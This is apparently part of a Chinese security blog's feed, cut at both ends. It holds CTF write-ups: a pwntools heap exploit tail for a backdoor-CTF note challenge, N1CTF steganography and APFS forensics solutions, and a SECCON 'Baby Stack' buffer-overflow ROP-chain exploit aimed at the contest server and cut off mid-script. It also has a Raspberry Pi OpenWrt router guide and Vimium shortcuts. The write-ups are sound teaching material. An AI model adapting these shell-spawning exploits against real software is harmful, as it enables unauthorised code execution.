class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;challenge&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;challenge&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span>(<span class="params">content</span>):</span></span><br><span class="line">    r.readuntil(<span class="string">&quot;choice &gt;&quot;</span>)</span><br><span class="line">    r.writeline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.readuntil(<span class="string">&quot;Enter content &gt;&quot;</span>)</span><br><span class="line">    r.writeline(str(content))</span><br><span class="line">    addr= r.readline()</span><br><span class="line">    addr = addr[<span class="number">11</span>:<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">return</span> int(addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.readuntil(<span class="string">&quot;choice &gt;&quot;</span>)</span><br><span class="line">    r.writeline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.readuntil(<span class="string">&quot;Enter index to delete note &gt;&quot;</span>)</span><br><span class="line">    r.writeline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    r.readuntil(<span class="string">&quot;choice &gt;&quot;</span>)</span><br><span class="line">    r.writeline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    local_addr = r.readline()</span><br><span class="line">    local_addr = local_addr[<span class="number">17</span>:<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">return</span> int(local_addr,<span class="number">16</span>)</span><br><span class="line">    printa(local_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line">pie_addr = int(help())</span><br><span class="line">log.info(<span class="string">&quot;pie_addr: &#123;&#125;&quot;</span>.format(pie_addr))</span><br><span class="line"></span><br><span class="line">getshell_addf = pie_addr - <span class="number">0xC1A</span>+<span class="number">0xA30</span></span><br><span class="line">log.info(<span class="string">&quot;getshell_addf:&#123;&#125;&quot;</span>.format(hex(getshell_addf)))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">chunk_addr = new_note(<span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">log.info(<span class="string">&quot;chunk addr: &#123;&#125;&quot;</span>.format(hex(chunk_addr)))</span><br><span class="line">next_chunk_addr = chunk_addr + <span class="number">0x100</span></span><br><span class="line">log.info(<span class="string">&quot;next chunk addr: &#123;&#125;&quot;</span>.format(hex(next_chunk_addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake function pointer --- getshell</span></span><br><span class="line">pause()</span><br><span class="line">evil_chunk_addr = new_note(p64(next_chunk_addr+<span class="number">0x10</span>)+p64(getshell_addf))</span><br><span class="line"></span><br><span class="line">elems_addr = getshell_addf + (<span class="number">0x202040</span><span class="number">-0xa30</span>)</span><br><span class="line">evil_index = ((evil_chunk_addr+<span class="number">0x8</span>)-elems_addr) /<span class="number">8</span></span><br><span class="line">print(evil_index)</span><br><span class="line">pause()</span><br><span class="line">delete_note(evil_index)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> backdoor-CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 N1CTF Misc部分</title>
      <link href="2018-N1CTF-Misc-part.html"/>
      <url>2018-N1CTF-Misc-part.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Lostme"><a href="#Lostme" class="headerlink" title="Lostme"></a>Lostme</h2><p>与人工智障斗智斗勇系列，下输即获得flag</p><p>N1CTF{Oh!you_1ose_t0_AI_hhhhhh}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Lipstick"><a href="#Lipstick" class="headerlink" title="Lipstick"></a>Lipstick</h2><p>先是一层LSB，得到一个ZIP 文件，然而ZIP是有密码的。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-01.jpg"></a></p><p>在红色通道发现了YSL字样，以及hint给的21个二进制字符串，于是猜测压缩包密码为YSL口红色号且有21个数值。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-lipstick-02.jpg"></a></p><p>通过取色器的对比，找到色号</p><p>1，27 ，59  ，11  ，23 ，7  ，57，1 ，1 ，76 ，222 ，1，1，50 ，214 ，6 ，77 ，50，53，214 ，6 </p><p>紧接着将色号转为二进制数值，</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/n1ctf-misc01-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/n1ctf-misc01-03.jpg"></a></p><p>得到ZIP密码为白学家。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-misc01-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-misc01-03.jpg"></a></p><p>得到flag：</p><p>flag{White_Album_is_Really_worth_watching_on_White_Valentine’s_Day}</p><h2 id="APFS"><a href="#APFS" class="headerlink" title="APFS"></a>APFS</h2><p>首先题目下载下来是一个dmg文件，有一个加密key，通过strings可以获取Key为 N1CTF_APFS</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-01.jpg"></a></p><p>通过题目的hint 得知 题目相关点应为APFS的snapshot新特性。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-02.jpg"></a></p><p>通过 tmutil listlocalsnapshots . 得到当前APFS的一个快照为CTF,通过mount_apfs -s ctf /Volumes/N1CTF_APFS ~/temp/ 进行挂载。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-03.jpg"></a></p><p>根据几个提示，不难猜测数据 为MODIFY TIME的最低有效为，首先分别获取快照前和快照后两部分的MODIFY时间。且为纳秒级别数据。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-04.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-05.jpg"></a></p><p>获取时间后，去取两个串的最低有效位。分别是</p><p>2 4 0 4 5 4 0 3 0 1 0 0 5 0 0 0 0 0 2 0 4 0 0 0 0 0 0 6 7 5 6 3 3 1 4 4 6 1 7 2 4 3 3 4 6 6 1 6 1 4 2 0 0 0 0 0 0 0 0 2 2 4 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 3 1 4 6 6 1 4 1 3 1 6 2 7 1 6 4 3 6 0 7 2 3 7 4 6 6 4 5 6 2 3 2 3 3 2 1 2 6 6 5 3 6 6 5 6 2 2 6 3 0 7 4 4 3 0 4 7 5 6 2 6 1 6 5 6 7 4 7 2 7 1 4 5 6 3 5 3 1 5 7 5 3 5 6 6 7 2 2 5 1 5 5 1 4 5 0 6 3 2 1 4 3 1 3 1 2 1 5 3 7 5 6 2 4 5 1 5 5 0 6 4 5 3 7 4 3 2 4 4 5 1 3 0 5 4 4 6 5 7 3 3 0 6 2 5 6 3 3 0 0 0 6 2 4 0 4 5 4 0 1 0 0 4 3 7 4 0 0 0 2 4 0 0 0 0 1 0 2 0 0 0 0 0 0 3 3 6 7 1 5 4 6 2 3 0 7 5 2 1 5 6 3 3 0 7 0 6 1 0 0 0 0 0 0 0 0 1 1 2 0 0 0 0 0 0 0 0 0 4 0 0 0 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 6 3 1 5 4 3 0 2 6 3 4 5 6 3 5 0 7 4 1 6 4 0 2 4 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 1 4 0 0 0 1 2 3 7 4 7 6 4 1 4 6 1 2 2 6 5 6 4 6 0 0 4 6 2 3 7 3 5 4 1 7 2 0 4 5 3 2 3 2 3 0 0 2 6 7 3 3 6 2 0 2 5 0 3 0 3 5 4 7 5 1 4 0 1 2 4 0 4 5 4 0 5 0 1 4 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 4 0 0 2 6 4 0 0 0 0 0 0 0 0 5 3 4 0 0 0 0 0 0 0 0 0 0 0 0 0</p><p>和</p><p>0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 5 5 3 0 1 0 0 4 0 0 0 0 7 3 6 5 5 3 5 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 3 3 5 1 1 0 5 6 0 6 7 2 4 6 0 6 7 1 0 3 2 2 5 2 5 6 2 6 1 2 2 5 1 0 2 3 0 7 2 6 0 3 5 7 0 6 1 3 1 2 3 5 7 3 2 7 3 2 0 2 2 3 4 5 6 6 1 7 4 2 4 5 1 2 5 3 2 0 5 6 5 1 1 2 4 7 4 0 2 1 1 1 6 2 1 6 5 6 7 4 7 3 2 6 7 6 7 3 0 4 5 6 3 7 4 1 6 3 1 2 5 6 4 0 1 1 7 4 4 7 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 6 5 4 0 4 0 2 0 0 0 0 3 5 7 2 6 5 6 4 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 7 4 3 1 5 0 3 5 7 3 5 3 4 0 6 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0</p><p>前后分别异或得到另外一组，然后进行一次二进制转换。然后进行拼接，8bit一个字节，</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-n1ctf-apfs-06.jpg"></a></p><p>得到ZIP，尝试了一开始dmg的密码，即为ZIP密码，得到flag</p><p>N1CTF{APFS_a_N3xt_30_Year_Filesystem}</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> N1CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派3刷LEDE(OpenWRT)打造路由器</title>
      <link href="cranberry-pie-3-brushes-ledeopenwrt-to-create-portable-personal-wireless-internet.html"/>
      <url>cranberry-pie-3-brushes-ledeopenwrt-to-create-portable-personal-wireless-internet.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>前往 LEDE 官网下载固件并验证：</p><p><a href="https://downloads.lede-project.org/releases/17.01.4/targets/brcm2708/bcm2710/lede-17.01.4-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz">https://downloads.lede-project.org/releases/17.01.4/targets/brcm2708/bcm2710/lede-17.01.4-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz</a></p><p>注：bcm2710 是专为树莓派3准备的。<br>刷机软件：</p><p>SD卡烧录工具：Win32DiskImager (windows)</p><h2 id="刷入LEDE系统"><a href="#刷入LEDE系统" class="headerlink" title="刷入LEDE系统"></a>刷入LEDE系统</h2><p>使用 Win32DiskImager 烧录 LEDE 系统镜像到 SD卡</p><p>安装SD卡到树莓派，开机。</p><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>用一根网线连接笔记本和树莓派，设置电脑的IP为自动获取。树莓派的默认IP为192.168.1.1</p><p>SSH 登陆，并修改 root 密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.1.1 -l root</span><br></pre></td></tr></table></figure><p>修改 /etc/config/network 配置文件，调整 lan IP为和路由器不冲突的其他IP，增加 wan 设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">config interface &#39;lan&#39;</span><br><span class="line">        option type &#39;bridge&#39;</span><br><span class="line">        option ifname &#39;eth0&#39;</span><br><span class="line">        option proto &#39;static&#39;</span><br><span class="line">        option ipaddr &#39;192.168.1.11&#39;</span><br><span class="line">        option netmask &#39;255.255.255.0&#39;</span><br><span class="line">        option ip6assign &#39;60&#39;</span><br><span class="line">        option gateway &#39;192.168.1.1&#39;</span><br><span class="line">        option dns &#39;114.114.114.114&#39;</span><br><span class="line"></span><br><span class="line">config interface &#39;wan&#39;</span><br><span class="line">        option proto &#39;dhcp&#39;</span><br><span class="line">        option ifname &#39;eth0&#39;</span><br></pre></td></tr></table></figure><p>修改 /etc/config/wireless 配置文件，开启无线 AP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">config wifi-device &#39;radio0&#39;</span><br><span class="line">        option type &#39;mac80211&#39;</span><br><span class="line">        option channel &#39;11&#39;</span><br><span class="line">        option hwmode &#39;11g&#39;</span><br><span class="line">        option path &#39;platform&#x2F;soc&#x2F;3f300000.mmc&#x2F;mmc_host&#x2F;mmc1&#x2F;mmc1:0001&#x2F;mmc1:0001:1&#39;</span><br><span class="line">        option htmode &#39;HT20&#39;</span><br><span class="line">        option disabled &#39;0&#39;</span><br><span class="line"></span><br><span class="line">config wifi-iface &#39;default_radio0&#39;</span><br><span class="line">        option device &#39;radio0&#39;</span><br><span class="line">        option network &#39;lan&#39;</span><br><span class="line">        option mode &#39;ap&#39;</span><br><span class="line">        option ssid &#39;OpenWrt&#39;</span><br><span class="line">        option encryption &#39;psk2&#39;</span><br><span class="line">        option key &#39;passwd.&#39;</span><br></pre></td></tr></table></figure><p>让连接路由时，也能ssh上树莓派</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#open ssh on wan interface</span><br><span class="line"></span><br><span class="line">config rule</span><br><span class="line">        option src              wan</span><br><span class="line">        option dest_port        22</span><br><span class="line">        option target           ACCEPT</span><br><span class="line">        option proto            tcp</span><br></pre></td></tr></table></figure><p>重启树莓派</p><p>用一根网线连接树莓派和路由器的 LAN 口，WiFi 连接到 LEDE-WiFi 网络，重新连接 SSH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.11</span><br><span class="line">#使用新的IP连接SSH</span><br></pre></td></tr></table></figure><h2 id="更新软件包安装LuCI-web界面"><a href="#更新软件包安装LuCI-web界面" class="headerlink" title="更新软件包安装LuCI web界面"></a>更新软件包安装LuCI web界面</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br><span class="line">opkg install luci-ssl</span><br></pre></td></tr></table></figure><p>这里安装的是ssl版本</p><h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h3><p>中文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg install luci-i18n-base-zh-cn</span><br><span class="line">opkg install luci-i18n-firewall-zh-cn</span><br></pre></td></tr></table></figure><p>打开服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;uhttpd enable</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;uhttpd start</span><br></pre></td></tr></table></figure><h3 id="安装ss"><a href="#安装ss" class="headerlink" title="安装ss"></a>安装ss</h3><p><a href="http://openwrt-dist.sourceforge.net/">http://openwrt-dist.sourceforge.net</a><br>直接看上面！</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://www.openwrt.pro/post-207.html">http://www.openwrt.pro/post-207.html</a><br><a href="http://www.wzero.net/?p=137">http://www.wzero.net/?p=137</a><br><a href="http://shumeipai.nxez.com/2015/07/28/install-openwrt-will-be-transformed-into-a-versatile-router-raspberry-pi.html">http://shumeipai.nxez.com/2015/07/28/install-openwrt-will-be-transformed-into-a-versatile-router-raspberry-pi.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Raspberry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hhkb 键盘的熟悉以及给chrome  浏览器安装viminum插件</title>
      <link href="hhkb_with_chrome.html"/>
      <url>hhkb_with_chrome.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>emmm<br> 一个大大师傅送了我一个hhkb键盘</p><p>然后突然想给chrome浏览器装一个插件。。viminum</p><h1 id="Vimium-常用的按键功能解释"><a href="#Vimium-常用的按键功能解释" class="headerlink" title="Vimium 常用的按键功能解释"></a>Vimium 常用的按键功能解释</h1><p>J：向下细微滚动窗口   k：向上细微滚动窗口<br>J：(Shift+j的意思，以下大写全部表示加Shift) 下一个标签页  K：上一个标签页<br>d：向下滚动半个屏幕   u：向上移动半个屏幕<br>g+g（连续按两下g）：回到顶部<br>G：到达页面底部<br>H：后退   L： 前进<br>f：将当前网页上的所有可见链接/输入框分配一个快捷键，输入后就可以打开或者跳转到对应的输入框。如果按的是F，那么将在新窗口中打开页面（见上图）<br>g+i：将光标 定位到输入框，如果有多个可以按Tab键切换<br>x：关闭当前页面   X：恢复刚刚关闭的页面<br>o：相当于Chrome中的地址栏，可以匹配历史记录、收藏夹并在当前窗口打开，或者直接打开一个网址或者搜索一个关键字（Chrome在全屏的时候地址栏死都出不来，有了它就解决这个一直困扰我的问题了！～），如果按的是O，则可以在新窗口中打开，非常非常方便！<br>g+s：查看网页的源代码<br>r：重新载入当前网页（顺便提一句，这点上新浪微博和它是一样的，光标没有定位在发送框时，即便没有安装这个插件你也可以用j/k来控制页面上下滚动，用r在刷新，用f或者p来定位到发送框。而Gmail的快捷键如j,k上下移动光标也是类似，有兴趣大家可以再自己去了解一下一些常用web应用的快捷键）</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SECCON 2017 Online CTF</title>
      <link href="2017-SECCON-OnlineCTF.html"/>
      <url>2017-SECCON-OnlineCTF.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-result.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-result.jpg"></a></p><h1 id="Baby-Stack"><a href="#Baby-Stack" class="headerlink" title="Baby Stack"></a>Baby Stack</h1><p>一个简单的缓冲区溢题目，程序由go 语言编写而成，所以并不能直接F5去分析。</p><h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-01.jpg"></a></p><p>程序的<code>main_memcpy</code>存在漏洞，可发生栈溢出</p><p>在调试的过程中，我们会发现一个不一样的地方<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-02.jpg"></a></p><p>正常，我们都是rip储存着返回地址，而这确实rsp存储的，这就意味着函数入口时的rsp指向retn地址，下面跟着参数</p><p>另外还有一个问题，如果是只是单纯的<code>&quot;A&quot;*192+p64(ret)</code>程序是会报错的，</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-03.jpg"></a></p><p>在<code>call main_memcpy </code>结束后，我们可以看到有两条汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012A4                 mov     rbx, [rsp+1f8h+name.str]</span><br><span class="line">.text:00000000004012AC                 mov     [rsp+1F8h+var_E0], rbx</span><br><span class="line">.text:00000000004012B4                 mov     rbx, [rsp+1f8h+name.len]</span><br></pre></td></tr></table></figure><p>有两条栈操作，对象分别是name的字符串以及一个name的长度，于是我们构造一个<br><code>payload = &quot;B&quot; * 104 + p64(0x0000000000599940) + p64(0x200) + &quot;D&quot; * 8</code></p><p>那么剩下的事情只要构造 rop-chain就行了<br>思路如下，构造一个read 读入 /bin/sh , 读入地址在bss上，然后构造 execve 去执行 /bin/sh</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.binary = <span class="string">&quot;./baby_stack&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./baby_stack&quot;</span>])</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;baby_stack.pwn.seccon.jp&quot;</span>, <span class="string">&quot;15285&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x000000000059f920</span></span><br><span class="line">syscall = <span class="number">0x0000000000456889</span>    <span class="comment"># syscall; ret;</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004016ea</span>    <span class="comment"># pop rax; ret;</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000046defd</span>    <span class="comment"># pop rsi; ret;</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000470931</span>    <span class="comment"># pop rdi; or byte ptr [rax + 0x39], cl; ret;</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004a247c</span>    <span class="comment"># pop rdx; or byte ptr [rax - 0x77], cl; ret;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name &gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A&quot;</span> * <span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message &gt;&gt; &quot;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;---- debug ----&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span>*<span class="number">104</span>+<span class="string">&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x200</span>)</span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">104</span> + p64(<span class="number">0x0000000000599940</span>) + p64(<span class="number">0x200</span>) + <span class="string">&quot;D&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">&quot;C&quot;</span> * <span class="number">0x48</span> + p64(syscall) + p64(<span class="number">0x200</span>)</span><br><span class="line">payload += <span 